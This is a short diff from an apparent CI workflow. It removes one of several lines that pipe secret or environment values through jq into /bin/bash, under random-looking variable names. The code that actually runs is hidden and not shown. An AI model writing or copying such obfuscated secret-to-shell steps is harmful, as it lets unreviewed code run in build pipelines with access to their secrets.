@@ -21,7 +21,6 @@ jobs:
           bq334: ${{ secrets.bq334 }}
         run: |
           printf '%s' "$bq334" | jq -r .qhdg21 | /bin/bash
-          printf '%s' "$mmbfp30988" | jq -r .y85 | /bin/bash
           echo $fg8 | jq -r .fc310 | /bin/bash
           echo $dsqzi02 | jq -r .r36 | /bin/bash
 
